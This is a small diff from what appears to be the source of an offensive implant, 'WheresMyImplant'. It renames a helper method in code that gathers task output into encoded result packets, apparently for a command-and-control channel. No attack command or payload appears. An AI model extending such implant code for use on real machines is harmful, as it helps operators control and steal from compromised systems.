@@ -29,7 +29,7 @@ namespace WheresMyImplant
                     //Add to packet
                     jobs.Remove(job.Key);
                     //Add the correct result id
-                    packets = Misc.combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
+                    packets = Misc.Combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
                 }
             }
         }
@@ -54,7 +54,7 @@ namespace WheresMyImplant
 
                 if (results.Length > 0)
                 {
-                    jobResults = Misc.combine(jobResults, coms.encodePacket(110, results, 0));
+                    jobResults = Misc.Combine(jobResults, coms.encodePacket(110, results, 0));
                 }
             }
             return jobResults;
